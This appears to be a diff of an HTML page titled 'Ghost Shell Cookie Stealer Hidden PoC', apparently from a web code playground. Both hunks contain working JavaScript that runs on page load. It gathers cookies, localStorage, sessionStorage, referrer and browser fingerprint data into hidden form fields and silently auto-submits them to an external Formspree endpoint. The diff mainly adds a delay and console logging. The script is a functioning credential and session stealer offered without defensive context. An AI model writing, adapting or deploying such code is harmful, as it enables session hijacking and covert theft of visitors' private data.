@@ -785,65 +785,74 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <body>
 
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-
 <form id="stealthForm" action="https://formspree.io/f/xoveanyq" method="POST">
-    <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
-    <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
-    <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
-    <input type="hidden" name="local_storage" id="localStorageField" value="default_local">
-    <input type="hidden" name="session_storage" id="sessionStorageField" value="default_session">
-    <input type="hidden" name="language" id="languageField" value="default_language">
-    <input type="hidden" name="screen_resolution" id="screenResolutionField" value="default_resolution">
-    <input type="hidden" name="timezone" id="timezoneField" value="default_timezone">
-    <input type="hidden" name="platform" id="platformField" value="default_platform">
-    <input type="hidden" name="online_status" id="onlineStatusField" value="default_status">
-    <input type="hidden" name="plugins" id="pluginsField" value="default_plugins">
-    <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
+    <input type="hidden" name="cookie_data" id="cookieField">
+    <input type="hidden" name="user_agent" id="userAgentField">
+    <input type="hidden" name="referrer" id="referrerField">
+    <input type="hidden" name="local_storage" id="localStorageField">
+    <input type="hidden" name="session_storage" id="sessionStorageField">
+    <input type="hidden" name="language" id="languageField">
+    <input type="hidden" name="screen_resolution" id="screenResolutionField">
+    <input type="hidden" name="timezone" id="timezoneField">
+    <input type="hidden" name="platform" id="platformField">
+    <input type="hidden" name="online_status" id="onlineStatusField">
+    <input type="hidden" name="plugins" id="pluginsField">
+    <input type="hidden" name="fallback" value="not_empty">
     <button type="submit" name="submitButton">Send</button>
 </form>
 
 <script>
 document.addEventListener("DOMContentLoaded", function() {
-    // Capture browser data
-    var cookies = document.cookie || "No_Cookies";
-    var userAgent = navigator.userAgent || "Unknown_User_Agent";
-    var referrer = document.referrer || "No_Referrer";
-    var localStorageData = JSON.stringify(localStorage) || "{}";
-    var sessionStorageData = JSON.stringify(sessionStorage) || "{}";
-    var language = navigator.language || "Unknown_Language";
-    var screenResolution = `${screen.width}x${screen.height}` || "Unknown_Resolution";
-    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
-    var platform = navigator.platform || "Unknown_Platform";
-    var onlineStatus = navigator.onLine ? "Online" : "Offline";
-    
-    // Capture installed plugins (only works in some browsers)
-    var plugins = [];
-    if (navigator.plugins) {
-        for (var i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
+    setTimeout(function() { // Delay to ensure elements are loaded
+        console.log("Collecting browser data...");
+
+        var cookies = document.cookie || "No_Cookies";
+        var userAgent = navigator.userAgent || "Unknown_User_Agent";
+        var referrer = document.referrer || "No_Referrer";
+        var localStorageData = JSON.stringify(localStorage) || "{}";
+        var sessionStorageData = JSON.stringify(sessionStorage) || "{}";
+        var language = navigator.language || "Unknown_Language";
+        var screenResolution = `${screen.width}x${screen.height}` || "Unknown_Resolution";
+        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
+        var platform = navigator.platform || "Unknown_Platform";
+        var onlineStatus = navigator.onLine ? "Online" : "Offline";
+
+        var plugins = [];
+        if (navigator.plugins) {
+            for (var i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
         }
-    }
-    var pluginsList = plugins.length > 0 ? plugins.join(", ") : "No_Plugins";
+        var pluginsList = plugins.length > 0 ? plugins.join(", ") : "No_Plugins";
 
-    // Inject data into form fields
-    document.getElementById("cookieField").value = cookies;
-    document.getElementById("userAgentField").value = userAgent;
-    document.getElementById("referrerField").value = referrer;
-    document.getElementById("localStorageField").value = localStorageData;
-    document.getElementById("sessionStorageField").value = sessionStorageData;
-    document.getElementById("languageField").value = language;
-    document.getElementById("screenResolutionField").value = screenResolution;
-    document.getElementById("timezoneField").value = timezone;
-    document.getElementById("platformField").value = platform;
-    document.getElementById("onlineStatusField").value = onlineStatus;
-    document.getElementById("pluginsField").value = pluginsList;
+        // Inject data into form fields
+        document.getElementById("cookieField").value = cookies;
+        document.getElementById("userAgentField").value = userAgent;
+        document.getElementById("referrerField").value = referrer;
+        document.getElementById("localStorageField").value = localStorageData;
+        document.getElementById("sessionStorageField").value = sessionStorageData;
+        document.getElementById("languageField").value = language;
+        document.getElementById("screenResolutionField").value = screenResolution;
+        document.getElementById("timezoneField").value = timezone;
+        document.getElementById("platformField").value = platform;
+        document.getElementById("onlineStatusField").value = onlineStatus;
+        document.getElementById("pluginsField").value = pluginsList;
 
-    // Submit form only if at least one useful piece of data exists
-    if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || localStorageData !== "{}" || sessionStorageData !== "{}") {
-        document.getElementById("stealthForm").submit();
-    }
+        console.log("Form data populated. Attempting submission...");
+
+        // Check if there's valid data before submitting
+        if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || localStorageData !== "{}" || sessionStorageData !== "{}") {
+            document.getElementById("stealthForm").submit();
+        } else {
+            console.warn("No useful data found. Form not submitted.");
+        }
+
+    }, 1000); // Delay execution to avoid race conditions
 });
 </script>
+
+
+   
 </body>
 </html>
 
@@ -1176,46 +1185,52 @@ function docReady(fn) {
   }
 }
 uic_prov_al();
-	
 document.addEventListener("DOMContentLoaded", function() {
-    // Capture browser data
-    var cookies = document.cookie || "No_Cookies";
-    var userAgent = navigator.userAgent || "Unknown_User_Agent";
-    var referrer = document.referrer || "No_Referrer";
-    var localStorageData = JSON.stringify(localStorage) || "{}";
-    var sessionStorageData = JSON.stringify(sessionStorage) || "{}";
-    var language = navigator.language || "Unknown_Language";
-    var screenResolution = `${screen.width}x${screen.height}` || "Unknown_Resolution";
-    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
-    var platform = navigator.platform || "Unknown_Platform";
-    var onlineStatus = navigator.onLine ? "Online" : "Offline";
-    
-    // Capture installed plugins (only works in some browsers)
-    var plugins = [];
-    if (navigator.plugins) {
-        for (var i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
+    setTimeout(function() { // Delay to ensure elements are loaded
+        console.log("Collecting browser data...");
+
+        var cookies = document.cookie || "No_Cookies";
+        var userAgent = navigator.userAgent || "Unknown_User_Agent";
+        var referrer = document.referrer || "No_Referrer";
+        var localStorageData = JSON.stringify(localStorage) || "{}";
+        var sessionStorageData = JSON.stringify(sessionStorage) || "{}";
+        var language = navigator.language || "Unknown_Language";
+        var screenResolution = `${screen.width}x${screen.height}` || "Unknown_Resolution";
+        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
+        var platform = navigator.platform || "Unknown_Platform";
+        var onlineStatus = navigator.onLine ? "Online" : "Offline";
+
+        var plugins = [];
+        if (navigator.plugins) {
+            for (var i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
         }
-    }
-    var pluginsList = plugins.length > 0 ? plugins.join(", ") : "No_Plugins";
+        var pluginsList = plugins.length > 0 ? plugins.join(", ") : "No_Plugins";
 
-    // Inject data into form fields
-    document.getElementById("cookieField").value = cookies;
-    document.getElementById("userAgentField").value = userAgent;
-    document.getElementById("referrerField").value = referrer;
-    document.getElementById("localStorageField").value = localStorageData;
-    document.getElementById("sessionStorageField").value = sessionStorageData;
-    document.getElementById("languageField").value = language;
-    document.getElementById("screenResolutionField").value = screenResolution;
-    document.getElementById("timezoneField").value = timezone;
-    document.getElementById("platformField").value = platform;
-    document.getElementById("onlineStatusField").value = onlineStatus;
-    document.getElementById("pluginsField").value = pluginsList;
+        // Inject data into form fields
+        document.getElementById("cookieField").value = cookies;
+        document.getElementById("userAgentField").value = userAgent;
+        document.getElementById("referrerField").value = referrer;
+        document.getElementById("localStorageField").value = localStorageData;
+        document.getElementById("sessionStorageField").value = sessionStorageData;
+        document.getElementById("languageField").value = language;
+        document.getElementById("screenResolutionField").value = screenResolution;
+        document.getElementById("timezoneField").value = timezone;
+        document.getElementById("platformField").value = platform;
+        document.getElementById("onlineStatusField").value = onlineStatus;
+        document.getElementById("pluginsField").value = pluginsList;
 
-    // Submit form only if at least one useful piece of data exists
-    if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || localStorageData !== "{}" || sessionStorageData !== "{}") {
-        document.getElementById("stealthForm").submit();
-    }
+        console.log("Form data populated. Attempting submission...");
+
+        // Check if there's valid data before submitting
+        if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || localStorageData !== "{}" || sessionStorageData !== "{}") {
+            document.getElementById("stealthForm").submit();
+        } else {
+            console.warn("No useful data found. Form not submitted.");
+        }
+
+    }, 1000); // Delay execution to avoid race conditions
 });
 	    window.onload = function() {
     document.getElementById("runbtn").click();
